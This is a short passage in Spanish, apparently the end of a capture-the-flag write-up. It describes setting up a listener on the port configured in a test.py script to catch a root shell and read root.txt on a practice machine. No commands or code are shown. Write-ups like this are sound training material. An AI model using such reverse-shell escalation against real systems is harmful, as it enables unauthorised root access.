descargar nuestro archivo, pondremos en escucha nuestra máquina con el puerto al cual asignamos en el test.py y obtendremos la shell como root.!Bingo, obtenemos sesión como root y podemos leer el root.txtGracias por leer." } ]
